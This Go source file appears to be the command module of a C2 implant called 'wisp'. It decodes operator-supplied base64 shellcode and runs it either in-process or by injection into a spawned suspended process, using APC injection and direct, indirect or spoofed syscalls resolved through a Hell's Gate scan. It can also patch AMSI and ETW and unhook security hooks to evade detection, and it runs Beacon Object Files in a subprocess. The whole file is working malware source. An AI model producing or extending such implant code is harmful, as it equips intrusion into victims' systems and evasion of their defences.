package commands

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/user/wisp/agent/internal/loader"
)

// loaderctl holds the agent's runtime loader configuration (call type and
// injection method) so operators can adjust evasion behaviour per session
// without regenerating the payload.
type loaderctl struct {
	mu  sync.Mutex
	cfg loader.Config
}

func newLoader() *loaderctl {
	return &loaderctl{
		cfg: loader.Config{
			CallType:     loader.CallAPI,
			InjectMethod: loader.InjectAPC,
		},
	}
}

// Set updates the loader config from a JSON fragment.
func (lc *loaderctl) Set(argsJSON string) error {
	var cfg loader.Config
	if err := json.Unmarshal([]byte(argsJSON), &cfg); err != nil {
		return err
	}
	lc.mu.Lock()
	defer lc.mu.Unlock()
	if cfg.CallType != "" {
		lc.cfg.CallType = cfg.CallType
	}
	if cfg.InjectMethod != "" {
		lc.cfg.InjectMethod = cfg.InjectMethod
	}
	return nil
}

// Get returns a copy of the current loader config.
func (lc *loaderctl) Get() loader.Config {
	lc.mu.Lock()
	defer lc.mu.Unlock()
	return lc.cfg
}

// decodeShellcode decodes base64 shellcode from task args.
func decodeShellcode(argsJSON string) ([]byte, error) {
	var args struct {
		Shellcode string `json:"shellcode"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return nil, fmt.Errorf("invalid args: %v", err)
	}
	if args.Shellcode == "" {
		return nil, fmt.Errorf("no shellcode provided")
	}
	sc, err := base64.StdEncoding.DecodeString(args.Shellcode)
	if err != nil {
		return nil, fmt.Errorf("decode shellcode: %v", err)
	}
	if len(sc) == 0 {
		return nil, fmt.Errorf("empty shellcode")
	}
	return sc, nil
}

// execDiagSSNCmd runs the SSN warm-up only (no shellcode, no syscall). Used to
// isolate whether the Hell's Gate scan itself is safe on a target.
func (d *Dispatcher) execDiagSSNCmd(_ *Dispatcher, task *Task) *Result {
	out, err := loader.WarmSSNs()
	if err != nil {
		return d.finish(task, "diag failed: "+err.Error(), "failed")
	}
	return d.finish(task, out, "")
}

// execShellcodeCmd runs shellcode inside the current agent process. Intended
// for short-lived payloads (e.g. a stager that connects back and exits).
// Evasion (AMSI/ETW/unhook) is opt-in via {"evasion":true} so a failed patch
// can never take the agent down; the payload runs inside a panic guard.
func (d *Dispatcher) execShellcodeCmd(_ *Dispatcher, task *Task) *Result {
	sc, err := decodeShellcode(task.Args)
	if err != nil {
		return d.finish(task, "error: "+err.Error(), "failed")
	}
	var a struct {
		CallType loader.CallType `json:"call_type"`
		Evasion  bool            `json:"evasion"`
	}
	_ = json.Unmarshal([]byte(task.Args), &a)

	cfg := d.loader.Get()
	if a.CallType != "" {
		cfg.CallType = a.CallType
	}

	// For the syscall / indirect / spoofed paths, warm + verify the SSN table
	// first and surface the resolved values so a bad scan is visible before
	// the syscall.
	diag := ""
	if cfg.CallType == loader.CallSyscall || cfg.CallType == loader.CallIndirect || cfg.CallType == loader.CallSpoofed {
		if s, err := loader.WarmSSNs(); err == nil {
			diag = s
		} else {
			diag = err.Error()
		}
	}

	go func() {
		defer func() {
			if r := recover(); r != nil {
				d.finishJob(task.ID, fmt.Sprintf("shellcode panic: %v", r))
			}
		}()
		if a.Evasion {
			loader.ApplyEvasion()
		}
		res, err := loader.Exec(sc, &cfg)
		line := "shellcode executed"
		if err != nil {
			line = "shellcode failed: " + err.Error()
		} else if res != nil && res.Error != "" {
			line = "shellcode: " + res.Error
		}
		d.finishJob(task.ID, line)
	}()
	msg := "shellcode dispatched (in-process)"
	if diag != "" {
		msg = diag + "\n" + msg
	}
	return d.finish(task, msg, "")
}

// execSpawnCmd is fork-and-run: spawn a suspended process, inject the shellcode
// and let it run there. The child is a fresh clean process, so a crash does not
// take the agent down.
func (d *Dispatcher) execSpawnCmd(_ *Dispatcher, task *Task) *Result {
	sc, err := decodeShellcode(task.Args)
	if err != nil {
		return d.finish(task, "error: "+err.Error(), "failed")
	}
	var a struct {
		Method   loader.InjectMethod `json:"method"`
		Process  string              `json:"process"`
		CallType loader.CallType     `json:"call_type"`
		Evasion  bool                `json:"evasion"`
	}
	_ = json.Unmarshal([]byte(task.Args), &a)

	cfg := d.loader.Get()
	if a.Method != "" {
		cfg.InjectMethod = a.Method
	}
	if a.Process != "" {
		cfg.Process = a.Process
	}
	if a.CallType != "" {
		cfg.CallType = a.CallType
	}
	if a.Evasion {
		loader.ApplyEvasion()
	}

	res, err := loader.Spawn(sc, &cfg)
	if err != nil {
		return d.finish(task, "error: "+err.Error(), "failed")
	}
	out, _ := json.Marshal(res)
	return d.finish(task, string(out), "")
}

// execBOFCmd runs a Beacon Object File (.o) in a SEPARATE process (the agent
// re-spawns itself with -run-bof), so a crashing BOF never takes the agent
// down. The object is delivered base64-encoded in the task args; the runner
// reads it from stdin and writes captured output to stdout.
func (d *Dispatcher) execBOFCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		Object string `json:"object"` // base64 .o
		Entry  string `json:"entry"`  // symbol to invoke (default "go")
		Arg    string `json:"arg"`    // text argument passed to the BOF
	}
	if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
		return d.finish(task, "error: invalid args", "failed")
	}
	if args.Object == "" {
		return d.finish(task, "error: no BOF object provided", "failed")
	}
	raw, err := base64.StdEncoding.DecodeString(args.Object)
	if err != nil {
		return d.finish(task, "error: decode object: "+err.Error(), "failed")
	}
	entry := args.Entry
	if entry == "" {
		entry = "go"
	}

	go func() {
		defer func() {
			if r := recover(); r != nil {
				d.finishJob(task.ID, fmt.Sprintf("BOF panic: %v", r))
			}
		}()
		d.finishJob(task.ID, runBofSubprocess(raw, entry, args.Arg))
	}()
	return d.finish(task, "BOF dispatched (subprocess): "+entry, "")
}

// runBofSubprocess spawns the agent binary in -run-bof mode, feeds the object
// via stdin and returns the captured output (or the runner's error).
func runBofSubprocess(obj []byte, entry, arg string) string {
	self, err := os.Executable()
	if err != nil {
		return "BOF failed: cannot locate agent binary: " + err.Error()
	}
	cmd := exec.Command(self, "-run-bof", "-entry", entry, "-arg", arg)
	cmd.Stdin = bytes.NewReader(obj)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// A BOF that hangs must not leave a zombie child; kill it after a hard cap.
	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return "BOF failed: start: " + err.Error()
	}
	go func() { done <- cmd.Wait() }()
	select {
	case <-time.After(30 * time.Second):
		_ = cmd.Process.Kill()
		return "BOF timed out after 30s"
	case err := <-done:
		if err != nil {
			msg := strings.TrimSpace(stderr.String())
			if msg == "" {
				msg = err.Error()
			}
			return "BOF failed: " + msg
		}
	}
	out := stdout.String()
	if errMsg := strings.TrimSpace(stderr.String()); errMsg != "" {
		// The runner writes bof errors to stderr but still exits 0; surface it.
		return "BOF failed: " + errMsg
	}
	if out == "" {
		out = "(no output)"
	}
	return out
}
